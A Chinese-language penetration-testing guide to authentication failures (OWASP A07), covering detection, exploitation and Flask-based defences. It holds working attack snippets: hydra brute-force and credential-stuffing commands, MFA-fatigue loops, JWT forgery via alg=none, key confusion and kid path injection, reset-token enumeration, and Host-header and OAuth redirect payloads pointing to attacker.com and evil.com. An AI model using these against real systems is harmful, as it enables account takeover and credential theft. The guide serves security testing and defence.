# 🆔 身份认证失效（A07: Identification and Authentication Failures）全技巧

> **OWASP Top 10 2021 — 第7位**  
> 身份认证和会话管理相关缺陷，包括弱密码、凭证泄露、会话劫持等。

---

## 📋 一、漏洞基础

### 1.1 什么是身份认证失效？

身份认证是验证"你是谁"的过程。当认证机制存在缺陷时，攻击者可**冒充合法用户**获取未授权访问。

### 1.2 常见场景

| 场景 | 说明 | 示例 |
|------|------|------|
| 🚫 **弱密码** | 允许简单密码 | password123, admin |
| 🚫 **暴力破解** | 无失败尝试限制 | 可无限尝试登录 |
| 🚫 **凭证填充** | 使用泄露凭证 | 撞库攻击 |
| 🚫 **弱会话Token** | 可预测/固定会话ID | SESSIONID=admin1 |
| 🚫 **Session固定** | 不更新登录后Session | 可劫持会话 |
| 🚫 **MFA绕过** | 多因素认证可绕过 | 删除MFA相关参数 |

### 1.3 危害

- 账号被盗
- 敏感数据泄露
- 提权访问未授权功能
- 身份冒用进行欺诈
- 撞库攻击牵连其他平台

---

## 🔍 二、基础检测技巧

### 2.1 弱密码策略检测

```bash
# 测试密码策略
# 尝试简单密码
curl -X POST https://target.com/api/register \
  -d '{"username":"test","password":"123456"}'

curl -X POST https://target.com/api/register \
  -d '{"username":"test","password":"a"}'

# 观察返回信息
# 如果成功注册，说明密码策略过弱！
```

### 2.2 暴力破解检测

```bash
# 测试登录是否有速率限制
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/login \
    -d "username=admin&password=wrong$i")
  echo "Attempt $i: $code"
done

# 如果所有100次都返回200/401（无429/403封锁），说明无保护！
```

### 2.3 Session Token分析

```bash
# 检查Cookie的安全属性
curl -sI https://target.com | grep -i "set-cookie"

# 检查是否有以下安全标志：
# Secure - 只在HTTPS传输
# HttpOnly - 禁止JS访问
# SameSite - 防CSRF
# Path=/ - 限定路径

# 分析Token随机性
# 多次请求获取不同Session，分析是否可预测
for i in $(seq 1 10); do
  curl -sI https://target.com | grep "Set-Cookie" >> sessions.txt
done
# 查看是否可预测（如时间戳、自增ID等）
```

### 2.4 凭证填充测试

```bash
# 使用已知泄露的用户名/密码进行测试
# 从 HaveIBeenPwned / 已知密码库 获取凭证

# 测试常见泄露密码
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# 测试多个账号同一密码
hydra -L users.txt -p "Password123!" \
  target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

---

## 🚀 三、进阶利用技巧

### 3.1 MFA/2FA 绕过技巧

```http
# 方式1：直接跳过MFA页面
# 正常流程：POST /login → 302 /mfa → POST /verify-mfa → 302 /dashboard
# 绕过：POST /login → 直接访问/dashboard

# 方式2：修改响应状态
POST /login HTTP/1.1
# 正常返回 {"require_mfa": true, "token": "abc123"}
# 尝试篡改返回处理

# 方式3：重复使用旧Token
# 如果MFA token不立即失效，可多次使用

# 方式4：OAuth MFA绕过
# 某些OAuth流程中，MFA只在前端检查
POST /oauth/token
# 删除 mfa_token 字段或设为 null
{"client_id": "xxx", "code": "xxx", "mfa_token": null}

# 方式5：MFA疲劳攻击
# 连续发送MFA请求直到用户误点"确认"
for i in $(seq 1 100); do
  curl -X POST https://target.com/api/login \
    -d "username=victim&password=leaked_pass"
done
```

### 3.2 Session 固定攻击

```http
# 1. 攻击者获取一个有效的Session
GET / HTTP/1.1
# 响应：Set-Cookie: SESSION=ATTACKER_SESSION

# 2. 诱使用户使用该Session（如通过链接）
<a href="https://target.com/login?SESSION=ATTACKER_SESSION">点击登录</a>

# 3. 用户登录后若Session不更新
# 攻击者使用原Session即可访问用户账户
Cookie: SESSION=ATTACKER_SESSION
```

### 3.3 JWT 认证绕过

```python
# JWT常见攻击场景
import jwt
import base64

# 场景1：alg=none
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."

# 场景2：弱密钥爆破
# 使用 jwt_tool
# python jwt_tool.py <token> -C -d rockyou.txt

# 场景3：算法混淆（RS256 → HS256）
# 如果知道RS256的公钥，可将其作为HMAC密钥签名
public_key = open("public.pem").read()
forged = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")

# 场景4：kid注入
# 如果JWT header中有kid字段
# {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
# 使用空文件作为密钥
forged = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers={"kid": "../../../../dev/null"})
```

### 3.4 密码重置功能滥用

```http
# 密码重置Token可预测
# 如果Token基于时间戳或自增ID

# 枚举重置Token
for i in $(seq 1000 2000); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/reset?token=$i")
  if [ "$code" = "200" ]; then
    echo "Found valid token: $i"
  fi
done

# 未绑定用户验证
POST /api/reset-password
{"user": "admin", "token": "已知token", "new_password": "hacked123"}
# 如果后端不验证token是否属于admin用户，可重置他人密码

# Host头污染
# 密码重置链接基于Host头生成
POST /api/forgot-password
Host: attacker.com
{"email": "victim@target.com"}
# 用户收到的重置链接将指向 attacker.com
```

### 3.5 会话超时测试

```bash
# 测试会话是否永不过期
# 1. 登录获取Session
# 2. 等待24小时
# 3. 使用原Session访问
curl -H "Cookie: SESSION=old_session" https://target.com/api/user/profile

# 如果仍然有效，说明会话超时过长或无超时

# 测试注销后Session是否失效
curl -X POST https://target.com/api/logout
curl -H "Cookie: SESSION=same_session" https://target.com/api/user/profile
# 如果仍然有效，说明注销未清除Session
```

### 3.6 OAuth 2.0 / OIDC 攻击

```http
# CSRF攻击OAuth流程
# 标准OAuth流程中有state参数防CSRF
# 如果缺少state参数，可做CSRF攻击

# 构造恶意链接
https://target.com/oauth/callback?code=MALICIOUS_CODE

# 诱使用户点击，攻击者将code绑定到自己的账户
# 用户账户与攻击者OAuth账户关联 → 攻击者可用自己账户登录用户

# Scope提升
# 修改scope参数获取更高权限
GET /oauth/authorize?client_id=xxx&redirect_uri=xxx&scope=user_info
# 改为：
GET /oauth/authorize?client_id=xxx&redirect_uri=xxx&scope=admin

# Redirect URI绕过
# 使用开放重定向
https://target.com/oauth/callback?redirect_uri=https://evil.com/steal_token
```

### 3.7 KeepMeLoggedIn / RememberMe 机制攻击

```python
# RememberMe功能常见缺陷

# 场景1：基于base64编码的用户信息
# Cookie内容：base64("admin:expiry_time")
import base64
cookie = base64.b64decode(remember_me_cookie)
# 如果只是简单编码，可伪造

# 场景2：持久化Token存储不当
# Token明文存储在数据库中
# 拖库后可直接使用

# 场景3：Token永不过期
# 即使改了密码，RememberMe token仍有效
# 使用旧token仍可登录
```

---

## 🛡️ 四、防御方案

### 4.1 密码策略配置

```python
# Flask 密码策略示例
from werkzeug.security import generate_password_hash, check_password_hash

# 密码复杂度要求
import re

def validate_password(password):
    if len(password) < 8:
        return False, "密码至少8位"
    if not re.search(r'[A-Z]', password):
        return False, "需要大写字母"
    if not re.search(r'[a-z]', password):
        return False, "需要小写字母"  
    if not re.search(r'[0-9]', password):
        return False, "需要数字"
    if not re.search(r'[!@#$%^&*]', password):
        return False, "需要特殊字符"
    return True, "OK"
```

### 4.2 速率限制实现

```python
# Flask-Limiter 登录保护
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.route("/api/login", methods=["POST"])
@limiter.limit("5 per minute")  # IP级别限流
@limiter.limit("10 per hour", key_func=lambda: request.json.get('username', ''))  # 用户级别
def login():
    # 登录逻辑
    pass

# 登录失败锁定
failed_attempts = {}

def check_lockout(username):
    if username in failed_attempts:
        if failed_attempts[username]['count'] >= 5:
            if time.time() - failed_attempts[username]['time'] < 900:  # 15分钟
                return False, "账号已锁定15分钟"
    return True, "OK"
```

### 4.3 Session 安全配置

```python
# Flask session 安全配置
app.config.update(
    SECRET_KEY='your-strong-secret-key-here',
    SESSION_COOKIE_SECURE=True,      # 仅HTTPS
    SESSION_COOKIE_HTTPONLY=True,     # 禁止JS访问
    SESSION_COOKIE_SAMESITE='Lax',    # 防CSRF
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2),  # 会话超时
    SESSION_REFRESH_EACH_REQUEST=True  # 每次请求刷新过期时间
)
```

### 4.4 MFA 最佳实践

| 要素 | 推荐方式 | 说明 |
|------|----------|------|
| 知识因素 | 密码 | 强密码+密码管理器 |
| 拥有因素 | TOTP/硬件Key | Google Authenticator / YubiKey |
| 继承因素 | 生物特征 | 指纹/面部识别（辅助） |
| 位置因素 | IP地理/设备 | 异常登录检测 |

### 4.5 凭证安全防护

| 策略 | 说明 |
|------|------|
| 🚫 不存储明文密码 | 使用Argon2/bcrypt/scrypt |
| 🚫 不使用密码提示 | 安全问题和答案同样被泄露 |
| ✅ 使用Passwordless | WebAuthn/FIDO2 |
| ✅ 登录异常检测 | 新设备/IP/地点检测 |
| ✅ 通知用户 | 新设备登录通知 |
| ✅ 定期凭证轮换 | 强制定期改密（高风险系统） |

---

## 🎯 五、实战检查清单

### 5.1 渗透测试要点

- [ ] 密码策略是否足够严格？
- [ ] 登录是否有速率限制/锁定机制？
- [ ] 是否有MFA？MFA是否可以绕过？
- [ ] Session Token是否随机且不可预测？
- [ ] Session是否有HttpOnly/Secure/SameSite属性？
- [ ] 登录后Session是否更新？
- [ ] 注销后Session是否失效？
- [ ] 密码重置Token是否可预测/枚举？
- [ ] RememberMe功能是否安全？
- [ ] OAuth流程是否有CSRF保护？

### 5.2 推荐工具

| 工具 | 用途 |
|------|------|
| Hydra | 在线密码爆破 |
| Burp Suite Intruder | 暴力破解/枚举 |
| JWT_Tool | JWT安全测试 |
| OWASP ZAP | 自动扫描认证问题 |
| jwt.io | JWT在线调试 |
| wfuzz | Web参数模糊测试 |

---

> **💡 核心原则**：身份认证是安全的第一道大门！必须做到：强密码 + 速率限制 + MFA + 安全Session + 异常检测，缺一不可！
